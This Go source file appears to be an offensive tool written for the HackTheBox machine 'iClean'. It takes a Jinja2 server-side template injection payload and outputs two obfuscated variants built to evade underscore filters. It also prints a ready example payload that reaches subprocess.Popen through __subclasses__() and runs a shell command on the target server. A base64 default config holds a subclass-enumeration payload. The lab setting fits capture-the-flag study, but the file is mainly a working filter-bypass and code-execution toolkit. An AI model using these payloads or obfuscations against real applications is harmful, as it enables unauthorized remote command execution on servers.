package main

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"regexp"
	"strings"

	cf "github.com/thepcn3rd/goAdventures/projects/commonFunctions"
)

// Use the GOPATH for development and then transition over to the prep script
// go env -w GOPATH="/home/thepcn3rd/go/workspaces/sstiObfuscator"

// To cross compile for linux
// GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o ssti.bin -ldflags "-w -s" main.go

// To cross compile windows
// GOOS=windows GOARCH=amd64 go build -o ssti.exe -ldflags "-w -s" main.go

/*
References:
https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f


*/

type confStruct struct {
	Payload string `json:"payload"`
}

func main() {
	//osDetected := runtime.GOOS
	//var config requestConfStruct
	var colorReset = "\033[0m"
	//var colorRed = "\033[31m"
	var colorGreen = "\033[32m"

	ConfigPtr := flag.String("conf", "config.json", "Configuration file to read")
	flag.Parse()

	// Check if the default config.json file exists if it does not exist create it
	if !(cf.FileExists("/config.json")) {
		fmt.Println("File does not exist...")
		b64configDefault := "ewoJInBheWxvYWQiOiAie3tfX2NsYXNzX18uX19iYXNlX18uX19zdWJjbGFzc2VzX18oKX19Igp9Cg=="
		b64decodedBytes, err := base64.StdEncoding.DecodeString(b64configDefault)
		cf.CheckError("Unable to decode the b64 of the config.json file", err, true)
		b64decodedString := string(b64decodedBytes)
		cf.SaveOutputFile(b64decodedString, "config.json")
	}

	// Load the config.json file
	fmt.Println("\nLoading the following config file: " + *ConfigPtr)
	configFile, err := os.Open(*ConfigPtr)
	cf.CheckError("Unable to open the configuration file", err, true)
	defer configFile.Close()
	decoder := json.NewDecoder(configFile)
	var config confStruct
	if err := decoder.Decode(&config); err != nil {
		cf.CheckError("Unable to decode the configuration file", err, true)
	}

	// Output the Original Payload
	fmt.Printf("\n%sOriginal Payload:%s %s\n\n", colorGreen, colorReset, config.Payload)

	curPayload := string(config.Payload)
	newPayload := curPayload
	// Method 1 - Output the Payload with the underscores replaced with hex characters
	// {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
	for strings.Contains(newPayload, "__") {
		var segmentsString []string
		// Does the Jinja2 have an __word__ in the string?
		reJinjaExpression := regexp.MustCompile(`__[a-z]+__(\.|)`)
		if reJinjaExpression.MatchString(newPayload) {
			reString := regexp.MustCompile(`(.+?)(__[a-z]+__(\.|))(.+)`)
			if reString.MatchString(newPayload) {
				segmentsString = reString.FindStringSubmatch(newPayload)
				//fmt.Println(segmentsString[1]) // Prior to the __word__
				//fmt.Println(segmentsString[2]) // The string that needs to be manipulated __word__
				//fmt.Println(segmentsString[3]) // The period if it exists
				//fmt.Println(segmentsString[4]) // After the word and the period
				//fmt.Println(curPayload)
			}
		}
		reWord := regexp.MustCompile(`__([a-z]+)__(\.|)`)
		if reWord.MatchString(segmentsString[2]) {
			//fmt.Println("Matches!!")
			grouping := reWord.FindStringSubmatch(segmentsString[2])
			//fmt.Println(grouping[0]) // Full matching string based on the regex
			//fmt.Println(grouping[1]) // word
			newSection := fmt.Sprintf("%s%s%s", "|attr('\\x5f\\x5f", grouping[1], "\\x5f\\x5f')")
			newPayload = fmt.Sprintf("%s%s%s\n", segmentsString[1], newSection, segmentsString[4])
		}
	}
	newPayload = strings.Replace(newPayload, "{{|attr", "{{()|attr", -1)
	newPayload = strings.Replace(newPayload, "{{ |attr", "{{ ()|attr", -1)
	fmt.Printf("%sMethod 1 Obfuscated:%s %s\n", colorGreen, colorReset, newPayload)

	newPayload = curPayload
	// Method 2
	// {{''|attr(["_"*2,"class","_"*2]|join)|attr(["_"*2,"base","_"*2]|join)|attr(["_"*2,"subclasses","_"*2]|join)()}}
	for strings.Contains(newPayload, "__") {
		var segmentsString []string
		// Does the Jinja2 have an __word__ in the string?
		reJinjaExpression := regexp.MustCompile(`__[a-z]+__(\.|)`)
		if reJinjaExpression.MatchString(newPayload) {
			reString := regexp.MustCompile(`(.+?)(__[a-z]+__(\.|))(.+)`)
			if reString.MatchString(newPayload) {
				segmentsString = reString.FindStringSubmatch(newPayload)
				//fmt.Println(segmentsString[1]) // Prior to the __word__
				//fmt.Println(segmentsString[2]) // The string that needs to be manipulated __word__
				//fmt.Println(segmentsString[3]) // The period if it exists
				//fmt.Println(segmentsString[4]) // After the word and the period
				//fmt.Println(curPayload)
			}
		}
		reWord := regexp.MustCompile(`__([a-z]+)__(\.|)`)
		if reWord.MatchString(segmentsString[2]) {
			//fmt.Println("Matches!!")
			grouping := reWord.FindStringSubmatch(segmentsString[2])
			//fmt.Println(grouping[0]) // Full matching string based on the regex
			//fmt.Println(grouping[1]) // word
			newSection := fmt.Sprintf("%s%s%s", "|attr([\"_\"*2,\"", grouping[1], "\",\"_\"*2]|join)")
			newPayload = fmt.Sprintf("%s%s%s\n", segmentsString[1], newSection, segmentsString[4])
		}
	}
	newPayload = strings.Replace(newPayload, "{{|attr", "{{''|attr", -1)
	newPayload = strings.Replace(newPayload, "{{ |attr", "{{ ''|attr", -1)
	fmt.Printf("%sMethod 2 Obfuscated:%s %s\n\n", colorGreen, colorReset, newPayload)

	fmt.Println("Notes: Written for SSTI for hackthebox box iClean.  Remove any unnecessary spaces.  Place parentheses around the major obfuscated parts.")
	stringMethod1 := "{{(()|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fbase\\x5f\\x5f')|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')())[365]('id',shell=True,stdout=-1).communicate()}}"
	fmt.Printf("Example Payload 1: %s\n", stringMethod1)
}
